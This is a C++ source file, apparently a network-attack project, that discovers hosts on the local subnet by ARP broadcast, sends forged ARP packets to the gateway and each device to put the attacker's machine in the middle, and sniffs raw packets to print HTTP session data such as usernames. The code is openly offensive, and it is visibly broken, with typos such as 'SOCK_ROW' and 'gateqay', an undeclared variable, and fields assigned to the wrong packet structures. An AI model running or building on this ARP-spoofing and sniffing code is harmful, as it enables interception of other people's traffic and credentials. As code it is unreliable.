#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>

#include "scan.h"
#include "pharm_attack.h"

using namespace std;

void arp_spoofing(string local_ip, string local_mac, string gateway_ip, vector<pair<string, string>> answered_list){

    //creat raw socket
    int sockfd = socket(AF_PACKET,SOCK_ROW, htons(ETH_P_ARP));
    if (sockfd <0) {
        perror ("socket() failed");
        exit (EXIT_FAILURE);
    }

    arp_header arp_reply_gateway;
    arp_header arp_reply_device;

    arp_reply_gateway.htype  = htons(1); //ethernet
    arp_reply_gateway.ptype  = htons(ETH_P_IP); //IP protocol
    arp_reply_gateway.hlen   = 6; //MAC address length
    arp_reply_gateway.plen   = 4; //IP address length
    arp_reply_gateway.opcode = htons(1); //ARP request

    arp_reply_device.htype  = htons(1); //ethernet
    arp_reply_device.ptype  = htons(ETH_P_IP); //IP protocol
    arp_reply_device.hlen   = 6; //MAC address length
    arp_reply_device.plen   = 4; //IP address length
    arp_reply_device.opcode = htons(1); //ARP request
    

    //sender mac is the attacker's mac
    memcpy(arp_reply_gateway.sender_mac, (void *)ether_aton(local_mac.c_str()), 6);
    memcpy(arp_reply_device.sender_mac, (void *)ether_aton(local_mac.c_str()), 6);

    //for packet to gateway, target mac is the gateway's mac
    //target ip is the gateway's ip
    memcpy(arp_reply_gateway.target_mac, (void *)ether_aton(local_mac.c_str()), 6);
    arp_reply_device.target_ip = inet_addr(gateway_ip.c_str());

    //for packet to device, sender ip is the gateway's ip
    arp_reply_device.sender_ip = inet_addr(gateway_ip.c_str());

    for(auto i = 0; i < answered_list.size(); i++){

        //to gateway
        arp_reply_gateqay.sender_ip = inet_addr(answered_list[i].first.c_str());

        //send packet to gateway
        sendto(sockfd, &arp_reply_gateway, sizeof(arp_reply_gateway), 0, (struct sockaddr*)&device, sizeof(device));

        //to device
        memcpy(arp_reply_device.target_mac, (void *)ether_aton(answered_list[i].second.c_str()), 6);
        arp_reply_device.target_ip = inet_addr(answered_list[i].first.c_str());
        
        //send packet to device
        sendto(sockfd, &arp_reply_device, sizeof(arp_reply_device), 0, (struct sockaddr*)&device, sizeof(device));

    }

    close(sockfd);

}


int fetch_username_from_HTTP_session(){
    
        
        int sockfd = socket(AF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
        if (sockfd <0) {
            perror ("socket() failed");
            exit (EXIT_FAILURE);
        }

       
        struct sockaddr_ll device;
        memset(&device, 0, sizeof(device));
    
        device.sll_family = AF_PACKET;
        device.sll_protocol = htons(ETH_P_ALL);
        device.sll_ifindex = if_nametoindex("eth0");
    
        bind(sockfd, (struct sockaddr*)&device, sizeof(device));
    
        char buffer[2048];
        memset(buffer, 0, sizeof(buffer));
    
        recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
    
        struct ethhdr *eth = (struct ethhdr *)buffer;
        struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
        struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
    
        char *data = buffer + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr);
    
        cout << "Data: " << data << endl;
    
        close(sockfd);
    
        return 0;
}

int main(){

    std::string sender_mac, target_mac;
    std::string sender_ip, netmask, ifname;
    
    // iterate through all network interfaces
    // stops if ifname != "lo"
    get_network_interface_info(sender_ip, netmask, sender_mac, ifname);

    std::vector<std::string> candidates;
    std::vector<std::pair<std::string, std::string>> answered_list;

    // use ip and netmask to calculate all possible neighbors
    get_host_in_range(sender_ip, netmask, candidates);

    // initiation of self defined arp operator
    // used to initialize & send & recv arp packets
    ARPOperator arp_operator(sender_ip, ifname);

    // initialize broadcast for neighbor discovery
    arp_operator.prepare_broadcast();
    for (auto candidate : candidates) {
        arp_operator.set_target(candidate, target_mac);
        arp_operator.send();
    }

    // set timeout
    // don't know how to set the actual timeout window
    arp_operator.clear_buffer();
    arp_operator.set_timeout(0, 100);
    int nbytes;
    std::string host_ip, host_mac;

    // print the banner
    std::cout << "Available devices" << std::endl;
    std::cout << "---------------------------------" << std::endl;
    std::cout << "IP\t\tMAC\t\t" << std::endl;
    std::cout << "---------------------------------" << std::endl;

    // recv packets continuously until timeout
    while (true) {
        nbytes = arp_operator.recv();
        if (nbytes < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // timeout
                break;
            } else {
                perror("arp_operator.recv() failed");
                exit(EXIT_FAILURE);
            }
        } else if (arp_operator.get_candidate_response(host_ip, host_mac)) {
            std::cout << host_ip << "\t" << host_mac << std::endl;
            answered_list.push_back(std::make_pair(host_ip, host_mac));
        }
    }

    string gateway_ip = get_gateway(ifname);
    arp_spoofing(sender_ip, sender_mac, gateway_ip, answered_list);

}


